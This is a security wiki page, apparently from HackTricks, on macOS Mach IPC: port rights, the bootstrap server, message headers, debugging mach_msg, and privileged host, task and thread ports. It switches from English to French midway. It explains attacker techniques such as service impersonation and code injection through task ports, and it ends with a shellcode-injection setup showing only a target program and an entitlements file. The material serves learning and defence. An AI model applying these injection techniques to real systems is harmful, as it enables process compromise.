# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach uses **tasks** as the **smallest unit** for sharing resources, and each task can contain **multiple threads**. These **tasks and threads are mapped 1:1 to POSIX processes and threads**.

Communication between tasks occurs via Mach Inter-Process Communication (IPC), utilising one-way communication channels. **Messages are transferred between ports**, which act kind of **message queues** managed by the kernel.

A **port** is the **basic** element of Mach IPC. It can be used to **send messages and to receive** them.

Each process has an **IPC table**, in there it's possible to find the **mach ports of the process**. The name of a mach port is actually a number (a pointer to the kernel object).

A process can also send a port name with some rights **to a different task** and the kernel will make this entry in the **IPC table of the other task** appear.

### Port Rights

Port rights, which define what operations a task can perform, are key to this communication. The possible **port rights** are ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Receive right**, which allows receiving messages sent to the port. Mach ports are MPSC (multiple-producer, single-consumer) queues, which means that there may only ever be **one receive right for each port** in the whole system (unlike with pipes, where multiple processes can all hold file descriptors to the read end of one pipe).
- A **task with the Receive** right can receive messages and **create Send rights**, allowing it to send messages. Originally only the **own task has Receive right over its por**t.
- If the owner of the Receive right **dies** or kills it, the **send right becomes useless (dead name).**
- **Send right**, which allows sending messages to the port.
- The Send right can be **cloned** so a task owning a Send right can clone the right and **grant it to a third task**.
- Note that **port rights** can also be **passed** though Mac messages.
- **Send-once right**, which allows sending one message to the port and then disappears.
- This right **cannot** be **cloned**, but it can be **moved**.
- **Port set right**, which denotes a _port set_ rather than a single port. Dequeuing a message from a port set dequeues a message from one of the ports it contains. Port sets can be used to listen on several ports simultaneously, a lot like `select`/`poll`/`epoll`/`kqueue` in Unix.
- **Dead name**, which is not an actual port right, but merely a placeholder. When a port is destroyed, all existing port rights to the port turn into dead names.

**Tasks can transfer SEND rights to others**, enabling them to send messages back. **SEND rights can also be cloned, so a task can duplicate and give the right to a third task**. This, combined with an intermediary process known as the **bootstrap server**, allows for effective communication between tasks.

### File Ports

File ports allow file descriptors to be encapsulated in Mach ports (using Mach port rights). It is possible to create a `fileport` from a given file descriptor with `fileport_makeport` and create a file descriptor from a `fileport` with `fileport_makefd`.

### Establishing a communication

As mentioned previously, it's possible to send rights using Mach messages, however, you **cannot send a right without already having a right** to send a Mach message. So, how is the first communication stablished?

For this, he **bootstrap server** (**launchd** in mac) is involved, as **everyone can get a SEND right to the bootstrap server**, it's possible to ask it for a right to send a message to another process:

1. Task **A** creates a **new port**, getting the **RECEIVE right** over it.
2. Task **A**, being the holder of the RECEIVE right, **generates a SEND right for the port**.
3. Task **A** establishes a **connection** with the **bootstrap server**, and **sends it the SEND right** for the port it generated at the beginning.
- Remember that anyone can get a SEND right to the bootstrap server.
4. Task A sends a `bootstrap_register` message to the bootstrap server to **associate the given port with a name** like `com.apple.taska`
5. Task **B** interacts with the **bootstrap server** to execute a bootstrap **lookup for the service** name (`bootstrap_lookup`). So the bootstrap server can respond, task B will send it a **SEND right to a port it previously created** inside the lookup message. If the lookup is successful, the **server duplicates the SEND right** received from Task A and **transmits it to Task B**.
- Remember that anyone can get a SEND right to the bootstrap server.
6. With this SEND right, **Task B** is capable of **sending** a **message** **to Task A**.
7. For a bi-directional communication usually task **B** generates a new port with a **RECEIVE** right and a **SEND** right, and gives the **SEND right to Task A** so it can send messages to TASK B (bi-directional communication).

The bootstrap server **cannot authenticate** the service name claimed by a task. This means a **task** could potentially **impersonate any system task**, such as falsely **claiming an authorization service name** and then approving every request.

Then, Apple stores the **names of system-provided services** in secure configuration files, located in **SIP-protected** directories: `/System/Library/LaunchDaemons` and `/System/Library/LaunchAgents`. Alongside each service name, the **associated binary is also stored**. The bootstrap server, will create and hold a **RECEIVE right for each of these service names**.

For these predefined services, the **lookup process differs slightly**. When a service name is being looked up, launchd starts the service dynamically. The new workflow is as follows:

- Task **B** initiates a bootstrap **lookup** for a service name.
- **launchd** checks if the task is running and if it isn’t, **starts** it.
- Task **A** (the service) performs a **bootstrap check-in** (`bootstrap_check_in()`). Here, the **bootstrap** server creates a SEND right, retains it, and **transfers the RECEIVE right to Task A**.
- launchd duplicates the **SEND right and sends it to Task B**.
- Task **B** generates a new port with a **RECEIVE** right and a **SEND** right, and gives the **SEND right to Task A** (the svc) so it can send messages to TASK B (bi-directional communication).

However, this process only applies to predefined system tasks. Non-system tasks still operate as described originally, which could potentially allow for impersonation.

> [!CAUTION]
> Therefore, launchd should never crash or the whole system will crash.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

The `mach_msg` function, essentially a system call, is utilized for sending and receiving Mach messages. The function requires the message to be sent as the initial argument. This message must commence with a `mach_msg_header_t` structure, succeeded by the actual message content. The structure is defined as follows:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Les processus possédant un _**droit de réception**_ peuvent recevoir des messages sur un port Mach. À l’inverse, les **émetteurs** se voient accorder un _**droit d’envoi**_ ou un _**droit d’envoi unique**_. Le droit d’envoi unique sert exclusivement à envoyer un seul message, après quoi il devient invalide.<sup>[[11]](#references)</sup>

Le champ initial **`msgh_bits`** est une bitmap :

- Le premier bit (le plus significatif) sert à indiquer qu’un message est complexe (plus de détails ci-dessous)
- Les 3e et 4e bits sont utilisés par le kernel
- Les **5 bits de poids faible du 2e octet** peuvent être utilisés pour le **voucher** : un autre type de port permettant d’envoyer des combinaisons clé/valeur.
- Les **5 bits de poids faible du 3e octet** peuvent être utilisés pour le **local port**
- Les **5 bits de poids faible du 4e octet** peuvent être utilisés pour le **remote port**

Les types pouvant être spécifiés dans les ports voucher, local et remote sont les suivants (depuis [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)) :<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Par exemple, `MACH_MSG_TYPE_MAKE_SEND_ONCE` peut être utilisé pour **indiquer** qu'un **send-once** **right** doit être dérivé et transféré pour ce port. `MACH_PORT_NULL` peut également être spécifié afin d'empêcher le destinataire de pouvoir répondre.

Afin d'obtenir une **communication bidirectionnelle** simple, un processus peut spécifier un **mach port** dans l'**en-tête** du message mach, appelé _port de réponse_ (**`msgh_local_port`**), sur lequel le **récepteur** du message peut **envoyer une réponse** à ce message.

> [!TIP]
> Notez que ce type de communication bidirectionnelle est utilisé dans les messages XPC qui attendent une réponse (`xpc_connection_send_message_with_reply` et `xpc_connection_send_message_with_reply_sync`). Mais **généralement, des ports différents sont créés**, comme expliqué précédemment, pour établir la communication bidirectionnelle.

Les autres champs de l'en-tête du message sont :

- `msgh_size` : la taille du paquet entier.
- `msgh_remote_port` : le port sur lequel ce message est envoyé.
- `msgh_voucher_port` : [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id` : l'ID de ce message, interprété par le récepteur.

> [!CAUTION]
> Notez que les **messages mach sont envoyés via un `mach port`**, qui est un canal de communication à **récepteur unique** et **émetteurs multiples** intégré au kernel mach. **Plusieurs processus** peuvent **envoyer des messages** à un mach port, mais à tout moment, **un seul processus peut en lire** les messages.

Les messages sont ensuite formés de l'en-tête **`mach_msg_header_t`**, suivi du **body** et du **trailer** (le cas échéant), et peuvent accorder l'autorisation d'y répondre. Dans ces cas, le kernel doit simplement transmettre le message d'une task à l'autre.

Un **trailer** correspond à des **informations ajoutées au message par le kernel** (elles ne peuvent pas être définies par l'utilisateur), qui peuvent être demandées lors de la réception du message avec les flags `MACH_RCV_TRAILER_<trailer_opt>` (différentes informations peuvent être demandées).

#### Messages complexes

Cependant, il existe d'autres messages plus **complexes**, comme ceux qui transmettent des rights de ports supplémentaires ou partagent de la mémoire, pour lesquels le kernel doit également envoyer ces objets au destinataire. Dans ces cas, le bit le plus significatif de l'en-tête `msgh_bits` est défini.

Les descripteurs pouvant être transmis sont définis dans [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
En 32 bits, tous les descripteurs font 12 octets et le type de descripteur se trouve dans le 11e. En 64 bits, les tailles varient.

> [!CAUTION]
> Le kernel copiera les descripteurs d'une tâche à l'autre, mais commencera par **créer une copie dans la mémoire du kernel**. Cette technique, connue sous le nom de « Feng Shui », a été utilisée dans plusieurs exploits pour forcer le **kernel à copier des données dans sa mémoire**, en faisant envoyer des descripteurs à un processus à lui-même. Le processus peut ensuite recevoir les messages (le kernel les libérera).
>
> Il est également possible **d'envoyer des port rights à un processus vulnérable** ; les port rights apparaîtront alors simplement dans le processus (même s'il ne les gère pas).

### Mac Ports APIs

Notez que les ports sont associés à l'espace de noms de la tâche ; pour créer ou rechercher un port, l'espace de noms de la tâche est donc également interrogé (plus d'informations dans `mach/mach_port.h`) :<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`** : **Créer** un port.
- `mach_port_allocate` peut également créer un **port set** : un receive right sur un groupe de ports. Lorsqu'un message est reçu, le port d'origine est indiqué.
- `mach_port_allocate_name` : Modifier le nom du port (un entier 32 bits par défaut)
- `mach_port_names` : Obtenir les noms des ports d'une cible
- `mach_port_type` : Obtenir les rights d'une tâche sur un nom
- `mach_port_rename` : Renommer un port (comme dup2 pour les FDs)
- `mach_port_allocate` : Allouer un nouveau RECEIVE, PORT_SET ou DEAD_NAME
- `mach_port_insert_right` : Créer un nouveau right dans un port sur lequel vous avez un RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`** : Fonctions utilisées pour **envoyer et recevoir des messages Mach**. La version overwrite permet de spécifier un buffer différent pour la réception des messages (l'autre version le réutilise simplement).

### Debug mach_msg

Comme les fonctions **`mach_msg`** et **`mach_msg_overwrite`** sont utilisées pour envoyer et recevoir des messages, placer un breakpoint dessus permettrait d'inspecter les messages envoyés et reçus.

Par exemple, commencez à déboguer n'importe quelle application que vous pouvez déboguer, car elle chargera **`libSystem.B` qui utilisera cette fonction**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Pour obtenir les arguments de **`mach_msg`**, vérifiez les registres. Voici les arguments (provenant de [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)) :
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Récupérez les valeurs des registres :
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Inspectez l’en-tête du message en vérifiant le premier argument :
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Ce type de `mach_msg_bits_t` est très courant pour permettre une réponse.

### Énumérer les ports
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Le **name** est le nom par défaut attribué au port (regardez comment il **augmente** dans les 3 premiers octets). L’**`ipc-object`** est l’**identifiant** unique **obfusqué** du port.\
Notez également comment les ports disposant uniquement du droit **`send`** **identifient leur propriétaire** (nom du port + pid).\
Notez aussi l’utilisation de **`+`** pour indiquer les **autres tâches connectées au même port**.

Il est également possible d’utiliser [**procesxp**](https://www.newosxbook.com/tools/procexp.html) pour voir aussi les **noms des services enregistrés** (avec SIP désactivé, en raison de la nécessité de disposer de `com.apple.system-task-port`) :
```
procesp 1 ports
```
Vous pouvez installer cet outil sur iOS en le téléchargeant depuis [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Exemple de code

Notez comment l’**expéditeur** **alloue** un port, crée un **send right** pour le nom `org.darlinghq.example` et l’envoie au **bootstrap server**, tandis que l’expéditeur demande le **send right** de ce nom et l’utilise pour **envoyer un message**.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Ports privilégiés

Certains ports spéciaux permettent à une tâche d’**effectuer certaines actions sensibles ou d’accéder à certaines données sensibles** lorsqu’elle dispose de droits **SEND** sur ceux-ci. Ces ports sont intéressants du point de vue d’un attaquant, à la fois en raison de leurs capacités et de la possibilité de **partager les droits SEND entre les tâches**.

### Ports spéciaux de l’hôte

Ces ports sont représentés par un nombre.

Les droits **SEND** peuvent être obtenus en appelant **`host_get_special_port`**, et les droits **RECEIVE** en appelant **`host_set_special_port`**. Cependant, les deux appels nécessitent le port **`host_priv`**, auquel seul root peut accéder. De plus, par le passé, root pouvait appeler **`host_set_special_port`** et détourner des ports arbitraires, ce qui permettait par exemple de contourner les signatures de code en détournant `HOST_KEXTD_PORT` (SIP empêche désormais cela).

Ils sont divisés en 2 groupes : les **7 premiers ports appartiennent au kernel** : le 1 est `HOST_PORT`, le 2 est `HOST_PRIV_PORT`, le 3 est `HOST_IO_MASTER_PORT` et le 7 est `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Ceux commençant **à partir** du numéro **8** sont **détenus par des system daemons** et peuvent être trouvés dans [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Port de l’hôte** : si un processus dispose du privilège **SEND** sur ce port, il peut obtenir des **informations** sur le **système** en appelant ses routines, comme :
- `host_processor_info` : obtenir des informations sur le processeur
- `host_info` : obtenir des informations sur l’hôte
- `host_virtual_physical_table_info` : table des pages virtuelles/physiques (nécessite MACH_VMDEBUG)
- `host_statistics` : obtenir les statistiques de l’hôte
- `mach_memory_info` : obtenir la disposition de la mémoire du kernel
- **Port Host Priv** : un processus disposant du droit **SEND** sur ce port peut effectuer des **actions privilégiées**, comme afficher les données de démarrage ou tenter de charger une extension du kernel. Le **processus doit être root** pour obtenir cette permission.
- De plus, pour appeler l’API **`kext_request`**, il est nécessaire de disposer d’autres entitlements **`com.apple.private.kext*`**, qui ne sont attribués qu’aux binaires Apple.
- D’autres routines pouvant être appelées sont :
- `host_get_boot_info` : obtenir `machine_boot_info()`
- `host_priv_statistics` : obtenir les statistiques privilégiées
- `vm_allocate_cpm` : allouer de la mémoire physique contiguë
- `host_processors` : droit SEND sur les processeurs de l’hôte
- `mach_vm_wire` : rendre la mémoire résidente
- Comme **root** peut accéder à cette permission, il pourrait appeler `host_set_[special/exception]_port[s]` afin de **détourner les ports spéciaux ou d’exception de l’hôte**.

Il est possible de **voir tous les ports spéciaux de l’hôte** en exécutant :
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

Ce sont des ports réservés à des services bien connus. Il est possible de les obtenir ou de les définir en appelant `task_[get/set]_special_port`. Ils se trouvent dans `task_special_ports.h` :
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: Le port utilisé pour contrôler cette tâche. Utilisé pour envoyer des messages qui affectent la tâche. Il s'agit du port renvoyé par **mach_task_self (voir Task Ports ci-dessous)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Le bootstrap port de la tâche. Utilisé pour envoyer des messages demandant le renvoi des ports d'autres services système.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Le port utilisé pour demander des informations sur l'hôte contenant la tâche. Il s'agit du port renvoyé par **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Le port désignant la source à partir de laquelle cette tâche obtient sa mémoire kernel wired.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Le port désignant la source à partir de laquelle cette tâche obtient sa mémoire par défaut gérée par le système de pagination.

### Task Ports

À l'origine, Mach n'avait pas de « processus », mais des « tâches », considérées davantage comme des conteneurs de threads. Lorsque Mach a été fusionné avec BSD, **chaque tâche a été associée à un processus BSD**. Ainsi, chaque processus BSD possède les détails nécessaires pour être un processus, et chaque tâche Mach possède également son fonctionnement interne (à l'exception de l'inexistant pid 0, qui correspond à `kernel_task`).

Deux fonctions très intéressantes sont associées à cela :<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Obtient un droit `SEND` pour le task port de la tâche correspondant au `pid` spécifié et le transmet au `target_task_port` indiqué (qui est généralement la tâche appelante ayant utilisé `mach_task_self()`, mais peut être un port `SEND` associé à une autre tâche).
- `pid_for_task(task, &pid)`: Étant donné un droit `SEND` vers une tâche, détermine à quel PID cette tâche est associée.

Pour effectuer des actions au sein de la tâche, celle-ci avait besoin d'un droit `SEND` vers elle-même en appelant `mach_task_self()` (qui utilise le `task_self_trap` (28)). Avec cette permission, une tâche peut effectuer plusieurs actions, notamment :

- `task_threads`: Obtenir un droit SEND sur tous les task ports des threads de la tâche
- `task_info`: Obtenir des informations sur une tâche
- `task_suspend/resume`: Suspendre ou reprendre une tâche
- `task_[get/set]_special_port`
- `thread_create`: Créer un thread
- `task_[get/set]_state`: Contrôler l'état de la tâche
- et bien d'autres fonctions disponibles dans [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Notez qu'avec un droit SEND sur le task port d'une **autre tâche**, il est possible d'effectuer ces actions sur cette autre tâche.

De plus, le task port est également le port **`vm_map`**, qui permet à un appelant de **lire et de manipuler la mémoire** au sein d'une tâche avec des fonctions telles que `vm_read()` et `vm_write()`. Cela signifie qu'une tâche disposant de droits SEND sur le task port d'une autre tâche peut **injecter du code dans cette tâche**.

Rappelez-vous que, puisque le **kernel est également une tâche**, si quelqu'un parvient à obtenir des **permissions SEND** sur le **`kernel_task`**, il pourra faire exécuter n'importe quoi au kernel (jailbreaks).

- Appelez `mach_task_self()` pour **obtenir le nom** de ce port pour la tâche appelante. Ce port est uniquement **hérité** lors d'un **`exec()`** ; une nouvelle tâche créée avec `fork()` obtient un nouveau task port (cas particulier : une tâche obtient également un nouveau task port après un **`exec()`** dans un binaire suid). La seule façon de créer une tâche et d'obtenir son port consiste à effectuer le [« port swap dance »](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) lors d'un `fork()`.
- Voici les restrictions d'accès au port (provenant de `macos_task_policy` dans le binaire `AppleMobileFileIntegrity`) :
- Si l'application possède l'entitlement **`com.apple.security.get-task-allow`**, les processus du **même utilisateur peuvent accéder au task port** (cet entitlement est généralement ajouté par Xcode pour le debugging). Le processus de **notarization** ne l'autorisera pas dans les releases de production.
- Les applications possédant l'entitlement **`com.apple.system-task-ports`** peuvent obtenir le **task port de n'importe quel** processus, à l'exception du kernel. Dans les anciennes versions, il s'appelait **`task_for_pid-allow`**. Il est uniquement accordé aux applications Apple.
- **Root peut accéder aux task ports** des applications **non compilées avec un runtime** hardened (et qui ne proviennent pas d'Apple).

**Le task name port :** une version non privilégiée du _task port_. Il fait référence à la tâche, mais ne permet pas de la contrôler. La seule fonction qui semble être disponible via celui-ci est `task_info()`.

### Thread Ports

Les threads possèdent également des ports associés, qui sont visibles depuis la tâche appelant **`task_threads`** et depuis le processeur avec `processor_set_threads`. Un droit SEND vers le thread port permet d'utiliser les fonctions du sous-système `thread_act`, notamment :

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

N'importe quel thread peut obtenir ce port en appelant **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Vous pouvez récupérer du shellcode depuis :


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

